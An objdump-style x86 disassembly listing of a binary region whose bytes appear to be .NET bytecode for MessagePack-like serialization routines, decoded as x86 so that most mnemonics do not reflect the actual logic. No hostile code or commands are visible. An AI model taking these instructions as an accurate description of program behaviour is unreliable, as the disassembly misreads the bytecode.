  4051b1:	09 17                	or     %edx,(%edi)
  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	00 40 55             	add    %al,0x55(%eax)
  4051c2:	00 00                	add    %al,(%eax)
  4051c4:	00 18                	add    %bl,(%eax)
  4051c6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051ca:	01 0b                	add    %ecx,(%ebx)
  4051cc:	03 07                	add    (%edi),%eax
  4051ce:	16                   	push   %ss
  4051cf:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051d2:	00 00                	add    %al,(%eax)
  4051d4:	0a 26                	or     (%esi),%ah
  4051d6:	07                   	pop    %es
  4051d7:	28 58 00             	sub    %bl,0x0(%eax)
  4051da:	00 06                	add    %al,(%esi)
  4051dc:	0b 07                	or     (%edi),%eax
  4051de:	16                   	push   %ss
  4051df:	28 07                	sub    %al,(%edi)
  4051e1:	01 00                	add    %eax,(%eax)
  4051e3:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051e6:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051e9:	00 06                	add    %al,(%esi)
  4051eb:	02 18                	add    (%eax),%bl
  4051ed:	7d 36                	jge    0x405225
  4051ef:	00 00                	add    %al,(%eax)
  4051f1:	04 16                	add    $0x16,%al
  4051f3:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051f8:	00 02                	add    %al,(%edx)
  4051fa:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051fe:	06                   	push   %es
  4051ff:	25 03 28 96 00       	and    $0x962803,%eax
  405204:	00 06                	add    %al,(%esi)
  405206:	6f                   	outsl  %ds:(%esi),(%dx)
  405207:	6a 00                	push   $0x0
  405209:	00 06                	add    %al,(%esi)
  40520b:	03 6f 88             	add    -0x78(%edi),%ebp
  40520e:	00 00                	add    %al,(%eax)
  405210:	06                   	push   %es
  405211:	09 17                	or     %edx,(%edi)
  405213:	58                   	pop    %eax
  405214:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405219:	2a 06                	sub    (%esi),%al
  40521b:	20 df                	and    %bl,%bh
  40521d:	00 00                	add    %al,(%eax)
  40521f:	00 40 55             	add    %al,0x55(%eax)
  405222:	00 00                	add    %al,(%eax)
  405224:	00 1a                	add    %bl,(%edx)
  405226:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40522a:	01 0b                	add    %ecx,(%ebx)
  40522c:	03 07                	add    (%edi),%eax
  40522e:	16                   	push   %ss
  40522f:	1a 6f 45             	sbb    0x45(%edi),%ch
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 26                	or     (%esi),%ah
  405236:	07                   	pop    %es
  405237:	28 58 00             	sub    %bl,0x0(%eax)
  40523a:	00 06                	add    %al,(%esi)
  40523c:	0b 07                	or     (%edi),%eax
  40523e:	16                   	push   %ss
  40523f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405243:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405246:	28 6b 00             	sub    %ch,0x0(%ebx)
  405249:	00 06                	add    %al,(%esi)
  40524b:	02 18                	add    (%eax),%bl
  40524d:	7d 36                	jge    0x405285
  40524f:	00 00                	add    %al,(%eax)
  405251:	04 16                	add    $0x16,%al
  405253:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405258:	00 02                	add    %al,(%edx)
  40525a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40525e:	06                   	push   %es
  40525f:	25 03 28 96 00       	and    $0x962803,%eax
  405264:	00 06                	add    %al,(%esi)
  405266:	6f                   	outsl  %ds:(%esi),(%dx)
  405267:	6a 00                	push   $0x0
  405269:	00 06                	add    %al,(%esi)
  40526b:	03 6f 88             	add    -0x78(%edi),%ebp
  40526e:	00 00                	add    %al,(%eax)
  405270:	06                   	push   %es
  405271:	09 17                	or     %edx,(%edi)
  405273:	58                   	pop    %eax
  405274:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405279:	2a 06                	sub    (%esi),%al
  40527b:	20 da                	and    %bl,%dl
  40527d:	00 00                	add    %al,(%eax)
  40527f:	00 40 0e             	add    %al,0xe(%eax)
  405282:	00 00                	add    %al,(%eax)
  405284:	00 02                	add    %al,(%edx)
  405286:	06                   	push   %es
  405287:	03 28                	add    (%eax),%ebp
  405289:	97                   	xchg   %eax,%edi
  40528a:	00 00                	add    %al,(%eax)
  40528c:	06                   	push   %es
  40528d:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405293:	06                   	push   %es
  405294:	20 db                	and    %bl,%bl
  405296:	00 00                	add    %al,(%eax)
  405298:	00 40 0e             	add    %al,0xe(%eax)
  40529b:	00 00                	add    %al,(%eax)
  40529d:	00 02                	add    %al,(%edx)
  40529f:	06                   	push   %es
  4052a0:	03 28                	add    (%eax),%ebp
  4052a2:	97                   	xchg   %eax,%edi
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	06                   	push   %es
  4052a6:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052ac:	06                   	push   %es
  4052ad:	20 d0                	and    %dl,%al
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	00 40 0f             	add    %al,0xf(%eax)
  4052b4:	00 00                	add    %al,(%eax)
  4052b6:	00 02                	add    %al,(%edx)
  4052b8:	03 6f 00             	add    0x0(%edi),%ebp
  4052bb:	01 00                	add    %eax,(%eax)
  4052bd:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c0:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052c4:	06                   	push   %es
  4052c5:	2a 06                	sub    (%esi),%al
  4052c7:	20 d1                	and    %dl,%cl
  4052c9:	00 00                	add    %al,(%eax)
  4052cb:	00 40 27             	add    %al,0x27(%eax)
  4052ce:	00 00                	add    %al,(%eax)
  4052d0:	00 18                	add    %bl,(%eax)
  4052d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052d6:	01 0b                	add    %ecx,(%ebx)
  4052d8:	03 07                	add    (%edi),%eax
  4052da:	16                   	push   %ss
  4052db:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052de:	00 00                	add    %al,(%eax)
  4052e0:	0a 26                	or     (%esi),%ah
  4052e2:	07                   	pop    %es
  4052e3:	28 58 00             	sub    %bl,0x0(%eax)
  4052e6:	00 06                	add    %al,(%esi)
  4052e8:	0b 02                	or     (%edx),%eax
  4052ea:	07                   	pop    %es
  4052eb:	16                   	push   %ss
  4052ec:	28 07                	sub    %al,(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 6a 28             	or     0x28(%edx),%ch
  4052f3:	74 00                	je     0x4052f5
  4052f5:	00 06                	add    %al,(%esi)
  4052f7:	2a 06                	sub    (%esi),%al
  4052f9:	20 d2                	and    %dl,%dl
  4052fb:	00 00                	add    %al,(%eax)
  4052fd:	00 40 27             	add    %al,0x27(%eax)
  405300:	00 00                	add    %al,(%eax)
  405302:	00 1a                	add    %bl,(%edx)
  405304:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405308:	01 0b                	add    %ecx,(%ebx)
  40530a:	03 07                	add    (%edi),%eax
  40530c:	16                   	push   %ss
  40530d:	1a 6f 45             	sbb    0x45(%edi),%ch
  405310:	00 00                	add    %al,(%eax)
  405312:	0a 26                	or     (%esi),%ah
  405314:	07                   	pop    %es
  405315:	28 58 00             	sub    %bl,0x0(%eax)
  405318:	00 06                	add    %al,(%esi)
  40531a:	0b 02                	or     (%edx),%eax
  40531c:	07                   	pop    %es
  40531d:	16                   	push   %ss
  40531e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405322:	0a 6a 28             	or     0x28(%edx),%ch
  405325:	74 00                	je     0x405327
  405327:	00 06                	add    %al,(%esi)
  405329:	2a 06                	sub    (%esi),%al
  40532b:	20 d3                	and    %dl,%bl
  40532d:	00 00                	add    %al,(%eax)
  40532f:	00 40 25             	add    %al,0x25(%eax)
  405332:	00 00                	add    %al,(%eax)
  405334:	00 1e                	add    %bl,(%esi)
  405336:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40533a:	01 0b                	add    %ecx,(%ebx)
  40533c:	03 07                	add    (%edi),%eax
  40533e:	16                   	push   %ss
  40533f:	1e                   	push   %ds
  405340:	6f                   	outsl  %ds:(%esi),(%dx)
  405341:	45                   	inc    %ebp
  405342:	00 00                	add    %al,(%eax)
  405344:	0a 26                	or     (%esi),%ah
  405346:	07                   	pop    %es
  405347:	28 58 00             	sub    %bl,0x0(%eax)
  40534a:	00 06                	add    %al,(%esi)
  40534c:	0b 02                	or     (%edx),%eax
  40534e:	07                   	pop    %es
  40534f:	16                   	push   %ss
  405350:	28 08                	sub    %cl,(%eax)
  405352:	01 00                	add    %eax,(%eax)
  405354:	0a 28                	or     (%eax),%ch
  405356:	74 00                	je     0x405358
  405358:	00 06                	add    %al,(%esi)
  40535a:	2a 00                	sub    (%eax),%al
  40535c:	1b 30                	sbb    (%eax),%esi
  40535e:	04 00                	add    $0x0,%al
  405360:	4d                   	dec    %ebp
  405361:	00 00                	add    %al,(%eax)
  405363:	00 27                	add    %ah,(%edi)
  405365:	00 00                	add    %al,(%eax)
  405367:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40536a:	00 00                	add    %al,(%eax)
  40536c:	0a 0a                	or     (%edx),%cl
  40536e:	02 06                	add    (%esi),%al
  405370:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  405376:	6f                   	outsl  %ds:(%esi),(%dx)
  405377:	e2 00                	loop   0x405379
  405379:	00 0a                	add    %cl,(%edx)
  40537b:	d4 8d                	aam    $0x8d
  40537d:	44                   	inc    %esp
  40537e:	00 00                	add    %al,(%eax)
  405380:	01 0b                	add    %ecx,(%ebx)
  405382:	06                   	push   %es
  405383:	16                   	push   %ss
  405384:	6a 6f                	push   $0x6f
  405386:	4e                   	dec    %esi
  405387:	00 00                	add    %al,(%eax)
  405389:	0a 06                	or     (%esi),%al
  40538b:	07                   	pop    %es
  40538c:	16                   	push   %ss
  40538d:	06                   	push   %es
  40538e:	6f                   	outsl  %ds:(%esi),(%dx)
  40538f:	e2 00                	loop   0x405391
  405391:	00 0a                	add    %cl,(%edx)
  405393:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40539a:	07                   	pop    %es
  40539b:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a1:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053a7:	39 06                	cmp    %eax,(%esi)
  4053a9:	00 00                	add    %al,(%eax)
  4053ab:	00 06                	add    %al,(%esi)
  4053ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4053ae:	33 00                	xor    (%eax),%eax
  4053b0:	00 0a                	add    %cl,(%edx)
  4053b2:	dc 08                	fmull  (%eax)
  4053b4:	2a 00                	sub    (%eax),%al
  4053b6:	00 00                	add    %al,(%eax)
  4053b8:	01 10                	add    %edx,(%eax)
  4053ba:	00 00                	add    %al,(%eax)
  4053bc:	02 00                	add    (%eax),%al
  4053be:	06                   	push   %es
  4053bf:	00 38                	add    %bh,(%eax)
  4053c1:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053c8:	13 30                	adc    (%eax),%esi
  4053ca:	02 00                	add    (%eax),%al
  4053cc:	ec                   	in     (%dx),%al
  4053cd:	00 00                	add    %al,(%eax)
  4053cf:	00 20                	add    %ah,(%eax)
  4053d1:	00 00                	add    %al,(%eax)
  4053d3:	11 02                	adc    %eax,(%edx)
  4053d5:	7b 36                	jnp    0x40540d
  4053d7:	00 00                	add    %al,(%eax)
  4053d9:	04 0a                	add    $0xa,%al
  4053db:	06                   	push   %es
  4053dc:	45                   	inc    %ebp
  4053dd:	0c 00                	or     $0x0,%al
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	05 00 00 00 05       	add    $0x5000000,%eax
  4053e6:	00 00                	add    %al,(%eax)
  4053e8:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053f3:	00 00                	add    %al,(%eax)
  4053f5:	1e                   	push   %ds
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 30                	add    %dh,(%eax)
  4053fa:	00 00                	add    %al,(%eax)
  4053fc:	00 42 00             	add    %al,0x0(%edx)
  4053ff:	00 00                	add    %al,(%eax)
  405401:	54                   	push   %esp
  405402:	00 00                	add    %al,(%eax)
  405404:	00 66 00             	add    %ah,0x0(%esi)
  405407:	00 00                	add    %al,(%eax)
  405409:	79 00                	jns    0x40540b
  40540b:	00 00                	add    %al,(%eax)
  40540d:	86 00                	xchg   %al,(%eax)
  40540f:	00 00                	add    %al,(%eax)
  405411:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  405417:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  40541d:	03 02                	add    (%edx),%eax
  40541f:	7b 35                	jnp    0x405456
  405421:	00 00                	add    %al,(%eax)
  405423:	04 74                	add    $0x74,%al
  405425:	38 00                	cmp    %al,(%eax)
  405427:	00 01                	add    %al,(%ecx)
  405429:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  40542f:	03 02                	add    (%edx),%eax
  405431:	7b 35                	jnp    0x405468
  405433:	00 00                	add    %al,(%eax)
  405435:	04 a5                	add    $0xa5,%al
  405437:	68 00 00 01 28       	push   $0x28010000
  40543c:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405441:	03 02                	add    (%edx),%eax
  405443:	7b 35                	jnp    0x40547a
  405445:	00 00                	add    %al,(%eax)
  405447:	04 a5                	add    $0xa5,%al
  405449:	95                   	xchg   %eax,%ebp
  40544a:	00 00                	add    %al,(%eax)
  40544c:	01 28                	add    %ebp,(%eax)
  40544e:	9f                   	lahf
  40544f:	00 00                	add    %al,(%eax)
  405451:	06                   	push   %es
  405452:	2a 03                	sub    (%ebx),%al
  405454:	02 7b 35             	add    0x35(%ebx),%bh
  405457:	00 00                	add    %al,(%eax)
  405459:	04 a5                	add    $0xa5,%al
  40545b:	6c                   	insb   (%dx),%es:(%edi)
  40545c:	00 00                	add    %al,(%eax)
  40545e:	01 28                	add    %ebp,(%eax)
  405460:	9e                   	sahf
  405461:	00 00                	add    %al,(%eax)
  405463:	06                   	push   %es
  405464:	2a 03                	sub    (%ebx),%al
  405466:	02 7b 35             	add    0x35(%ebx),%bh
  405469:	00 00                	add    %al,(%eax)
  40546b:	04 a5                	add    $0xa5,%al
  40546d:	96                   	xchg   %eax,%esi
  40546e:	00 00                	add    %al,(%eax)
  405470:	01 28                	add    %ebp,(%eax)
  405472:	9c                   	pushf
  405473:	00 00                	add    %al,(%eax)
  405475:	06                   	push   %es
  405476:	2a 03                	sub    (%ebx),%al
  405478:	02 7b 35             	add    0x35(%ebx),%bh
  40547b:	00 00                	add    %al,(%eax)
  40547d:	04 a5                	add    $0xa5,%al
  40547f:	97                   	xchg   %eax,%edi
  405480:	00 00                	add    %al,(%eax)
  405482:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  405486:	00 00                	add    %al,(%eax)
  405488:	06                   	push   %es
  405489:	2a 03                	sub    (%ebx),%al
  40548b:	02 28                	add    (%eax),%ch
  40548d:	77 00                	ja     0x40548f
  40548f:	00 06                	add    %al,(%esi)
  405491:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  405497:	03 02                	add    (%edx),%eax
  405499:	7b 35                	jnp    0x4054d0
  40549b:	00 00                	add    %al,(%eax)
  40549d:	04 74                	add    $0x74,%al
  40549f:	02 00                	add    (%eax),%al
  4054a1:	00 1b                	add    %bl,(%ebx)
  4054a3:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054a9:	02 03                	add    (%ebx),%al
  4054ab:	28 72 00             	sub    %dh,0x0(%edx)
  4054ae:	00 06                	add    %al,(%esi)
  4054b0:	2a 02                	sub    (%edx),%al
  4054b2:	03 28                	add    (%eax),%ebp
  4054b4:	73 00                	jae    0x4054b6
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 03                	sub    (%ebx),%al
  4054ba:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c0:	1b 30                	sbb    (%eax),%esi
  4054c2:	03 00                	add    (%eax),%eax
  4054c4:	42                   	inc    %edx
  4054c5:	00 00                	add    %al,(%eax)
  4054c7:	00 28                	add    %ch,(%eax)
  4054c9:	00 00                	add    %al,(%eax)
  4054cb:	11 02                	adc    %eax,(%edx)
  4054cd:	0a 16                	or     (%esi),%dl
  4054cf:	0b 06                	or     (%esi),%eax
  4054d1:	12 01                	adc    (%ecx),%al
  4054d3:	28 49 00             	sub    %cl,0x0(%ecx)
  4054d6:	00 0a                	add    %cl,(%edx)
  4054d8:	02 7b 39             	add    0x39(%ebx),%bh
  4054db:	00 00                	add    %al,(%eax)
  4054dd:	04 3a                	add    $0x3a,%al
  4054df:	12 00                	adc    (%eax),%al
  4054e1:	00 00                	add    %al,(%eax)
  4054e3:	02 02                	add    (%edx),%al
  4054e5:	02 7b 38             	add    0x38(%ebx),%bh
  4054e8:	00 00                	add    %al,(%eax)
  4054ea:	04 73                	add    $0x73,%al
  4054ec:	63 00                	arpl   %eax,(%eax)
  4054ee:	00 06                	add    %al,(%esi)
  4054f0:	7d 39                	jge    0x40552b
  4054f2:	00 00                	add    %al,(%eax)
  4054f4:	04 dd                	add    $0xdd,%al
  4054f6:	0d 00 00 00 07       	or     $0x7000000,%eax
  4054fb:	39 06                	cmp    %eax,(%esi)
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 06                	add    %al,(%esi)
  405501:	28 50 00             	sub    %dl,0x0(%eax)
  405504:	00 0a                	add    %cl,(%edx)
  405506:	dc 02                	faddl  (%edx)
  405508:	7b 39                	jnp    0x405543
  40550a:	00 00                	add    %al,(%eax)
  40550c:	04 2a                	add    $0x2a,%al
  40550e:	00 00                	add    %al,(%eax)
  405510:	01 10                	add    %edx,(%eax)
  405512:	00 00                	add    %al,(%eax)
  405514:	02 00                	add    (%eax),%al
  405516:	04 00                	add    $0x0,%al
  405518:	2a 2e                	sub    (%esi),%ch
  40551a:	00 0d 00 00 00 00    	add    %cl,0x0
  405520:	13 30                	adc    (%eax),%esi
  405522:	04 00                	add    $0x0,%al
  405524:	18 00                	sbb    %al,(%eax)
  405526:	00 00                	add    %al,(%eax)
  405528:	29 00                	sub    %eax,(%eax)
  40552a:	00 11                	add    %dl,(%ecx)
  40552c:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  405532:	0a 02                	or     (%edx),%al
  405534:	06                   	push   %es
  405535:	16                   	push   %ss
  405536:	03 6f 45             	add    0x45(%edi),%ebp
  405539:	00 00                	add    %al,(%eax)
  40553b:	0a 26                	or     (%esi),%ah
  40553d:	06                   	push   %es
  40553e:	28 55 00             	sub    %dl,0x0(%ebp)
  405541:	00 06                	add    %al,(%esi)
  405543:	2a 13                	sub    (%ebx),%dl
  405545:	30 04 00             	xor    %al,(%eax,%eax,1)
  405548:	b1 00                	mov    $0x0,%cl
  40554a:	00 00                	add    %al,(%eax)
  40554c:	2a 00                	sub    (%eax),%al
  40554e:	00 11                	add    %dl,(%ecx)
  405550:	14 0a                	adc    $0xa,%al
  405552:	16                   	push   %ss
  405553:	0b 02                	or     (%edx),%eax
  405555:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  40555b:	18 00                	sbb    %al,(%eax)
  40555d:	00 00                	add    %al,(%eax)
  40555f:	02 20                	add    (%eax),%ah
  405561:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  405566:	0d 00 00 00 02       	or     $0x2000000,%eax
  40556b:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405571:	0b 38                	or     (%eax),%edi
  405573:	72 00                	jb     0x405575
  405575:	00 00                	add    %al,(%eax)
  405577:	02 20                	add    (%eax),%ah
  405579:	d9 00                	flds   (%eax)
  40557b:	00 00                	add    %al,(%eax)
  40557d:	40                   	inc    %eax
  40557e:	0c 00                	or     $0x0,%al
  405580:	00 00                	add    %al,(%eax)
  405582:	03 6f 00             	add    0x0(%edi),%ebp
  405585:	01 00                	add    %eax,(%eax)
  405587:	0a 0b                	or     (%ebx),%cl
  405589:	38 5b 00             	cmp    %bl,0x0(%ebx)
  40558c:	00 00                	add    %al,(%eax)
  40558e:	02 20                	add    (%eax),%ah
  405590:	da 00                	fiaddl (%eax)
  405592:	00 00                	add    %al,(%eax)
  405594:	40                   	inc    %eax
  405595:	25 00 00 00 18       	and    $0x18000000,%eax
  40559a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40559e:	01 0a                	add    %ecx,(%edx)
  4055a0:	03 06                	add    (%esi),%eax
  4055a2:	16                   	push   %ss
  4055a3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055a6:	00 00                	add    %al,(%eax)
  4055a8:	0a 26                	or     (%esi),%ah
  4055aa:	06                   	push   %es
  4055ab:	28 58 00             	sub    %bl,0x0(%eax)
  4055ae:	00 06                	add    %al,(%esi)
  4055b0:	0a 06                	or     (%esi),%al
  4055b2:	16                   	push   %ss
  4055b3:	28 02                	sub    %al,(%edx)
  4055b5:	01 00                	add    %eax,(%eax)
  4055b7:	0a 0b                	or     (%ebx),%cl
  4055b9:	38 2b                	cmp    %ch,(%ebx)
  4055bb:	00 00                	add    %al,(%eax)
  4055bd:	00 02                	add    %al,(%edx)
  4055bf:	20 db                	and    %bl,%bl
  4055c1:	00 00                	add    %al,(%eax)
  4055c3:	00 40 20             	add    %al,0x20(%eax)
  4055c6:	00 00                	add    %al,(%eax)
  4055c8:	00 1a                	add    %bl,(%edx)
  4055ca:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ce:	01 0a                	add    %ecx,(%edx)
  4055d0:	03 06                	add    (%esi),%eax
  4055d2:	16                   	push   %ss
  4055d3:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055d6:	00 00                	add    %al,(%eax)
  4055d8:	0a 26                	or     (%esi),%ah
  4055da:	06                   	push   %es
  4055db:	28 58 00             	sub    %bl,0x0(%eax)
  4055de:	00 06                	add    %al,(%esi)
  4055e0:	0a 06                	or     (%esi),%al
  4055e2:	16                   	push   %ss
  4055e3:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055e7:	0a 0b                	or     (%ebx),%cl
  4055e9:	07                   	pop    %es
  4055ea:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ee:	01 0a                	add    %ecx,(%edx)
  4055f0:	03 06                	add    (%esi),%eax
  4055f2:	16                   	push   %ss
  4055f3:	07                   	pop    %es
  4055f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4055f5:	45                   	inc    %ebp
  4055f6:	00 00                	add    %al,(%eax)
  4055f8:	0a 26                	or     (%esi),%ah
  4055fa:	06                   	push   %es
  4055fb:	28 55 00             	sub    %dl,0x0(%ebp)
  4055fe:	00 06                	add    %al,(%esi)
  405600:	2a 00                	sub    (%eax),%al
  405602:	00 00                	add    %al,(%eax)
  405604:	13 30                	adc    (%eax),%esi
  405606:	04 00                	add    $0x0,%al
  405608:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  40560d:	00 00                	add    %al,(%eax)
  40560f:	11 03                	adc    %eax,(%ebx)
  405611:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  405615:	06                   	push   %es
  405616:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405619:	06                   	push   %es
  40561a:	8e 69 0c             	mov    0xc(%ecx),%gs
  40561d:	16                   	push   %ss
  40561e:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  405623:	16                   	push   %ss
  405624:	00 00                	add    %al,(%eax)
  405626:	00 20                	add    %ah,(%eax)
  405628:	a0 00 00 00 08       	mov    0x8000000,%al
  40562d:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405630:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  405635:	00 00                	add    %al,(%eax)
  405637:	0a 38                	or     (%eax),%bh
  405639:	80 00 00             	addb   $0x0,(%eax)
  40563c:	00 08                	add    %cl,(%eax)
  40563e:	20 ff                	and    %bh,%bh
  405640:	00 00                	add    %al,(%eax)
  405642:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405648:	20 d9                	and    %bl,%cl
  40564a:	00 00                	add    %al,(%eax)
  40564c:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405652:	00 00                	add    %al,(%eax)
  405654:	0a 08                	or     (%eax),%cl
  405656:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  40565c:	00 00                	add    %al,(%eax)
  40565e:	0a 38                	or     (%eax),%bh
  405660:	59                   	pop    %ecx
  405661:	00 00                	add    %al,(%eax)
  405663:	00 08                	add    %cl,(%eax)
  405665:	20 ff                	and    %bh,%bh
  405667:	ff 00                	incl   (%eax)
  405669:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40566f:	20 da                	and    %bl,%dl
  405671:	00 00                	add    %al,(%eax)
  405673:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405679:	00 00                	add    %al,(%eax)
  40567b:	0a 08                	or     (%eax),%cl
  40567d:	68 28 ef 00 00       	push   $0xef28
  405682:	0a 28                	or     (%eax),%ch
  405684:	58                   	pop    %eax
  405685:	00 00                	add    %al,(%eax)
  405687:	06                   	push   %es
  405688:	0b 02                	or     (%edx),%eax
  40568a:	07                   	pop    %es
  40568b:	16                   	push   %ss
  40568c:	07                   	pop    %es
  40568d:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405690:	4c                   	dec    %esp
  405691:	00 00                	add    %al,(%eax)
  405693:	0a 38                	or     (%eax),%bh
  405695:	24 00                	and    $0x0,%al
  405697:	00 00                	add    %al,(%eax)
  405699:	20 db                	and    %bl,%bl
  40569b:	00 00                	add    %al,(%eax)
  40569d:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	0a 08                	or     (%eax),%cl
  4056a7:	28 4a 00             	sub    %cl,0x0(%edx)
  4056aa:	00 0a                	add    %cl,(%edx)
  4056ac:	28 58 00             	sub    %bl,0x0(%eax)
  4056af:	00 06                	add    %al,(%esi)
  4056b1:	0b 02                	or     (%edx),%eax
  4056b3:	07                   	pop    %es
  4056b4:	16                   	push   %ss
  4056b5:	07                   	pop    %es
  4056b6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056b9:	4c                   	dec    %esp
  4056ba:	00 00                	add    %al,(%eax)
  4056bc:	0a 02                	or     (%edx),%al
  4056be:	06                   	push   %es
  4056bf:	16                   	push   %ss
  4056c0:	06                   	push   %es
  4056c1:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c4:	4c                   	dec    %esp
  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 2a                	or     (%edx),%ch
  4056c9:	00 00                	add    %al,(%eax)
  4056cb:	00 13                	add    %dl,(%ebx)
  4056cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d0:	94                   	xchg   %eax,%esp
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056d6:	00 11                	add    %dl,(%ecx)
  4056d8:	14 0a                	adc    $0xa,%al
  4056da:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e0:	07                   	pop    %es
  4056e1:	20 ff                	and    %bh,%bh
  4056e3:	00 00                	add    %al,(%eax)
  4056e5:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056eb:	20 c4                	and    %al,%ah
  4056ed:	00 00                	add    %al,(%eax)
  4056ef:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056f2:	08 6f ee             	or     %ch,-0x12(%edi)
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	0a 07                	or     (%edi),%al
  4056f9:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  4056fc:	08 6f ee             	or     %ch,-0x12(%edi)
  4056ff:	00 00                	add    %al,(%eax)
  405701:	0a 38                	or     (%eax),%bh
  405703:	59                   	pop    %ecx
  405704:	00 00                	add    %al,(%eax)
  405706:	00 07                	add    %al,(%edi)
  405708:	20 ff                	and    %bh,%bh
  40570a:	ff 00                	incl   (%eax)
  40570c:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405712:	20 c5                	and    %al,%ch
  405714:	00 00                	add    %al,(%eax)
  405716:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405719:	08 6f ee             	or     %ch,-0x12(%edi)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	0a 07                	or     (%edi),%al
  405720:	68 28 ef 00 00       	push   $0xef28
  405725:	0a 28                	or     (%eax),%ch
  405727:	58                   	pop    %eax
  405728:	00 00                	add    %al,(%eax)
  40572a:	06                   	push   %es
  40572b:	0a 02                	or     (%edx),%al
  40572d:	06                   	push   %es
  40572e:	16                   	push   %ss
  40572f:	06                   	push   %es
  405730:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405733:	4c                   	dec    %esp
  405734:	00 00                	add    %al,(%eax)
  405736:	0a 38                	or     (%eax),%bh
  405738:	24 00                	and    $0x0,%al
  40573a:	00 00                	add    %al,(%eax)
  40573c:	20 c6                	and    %al,%dh
  40573e:	00 00                	add    %al,(%eax)
  405740:	00 0c 02             	add    %cl,(%edx,%eax,1)
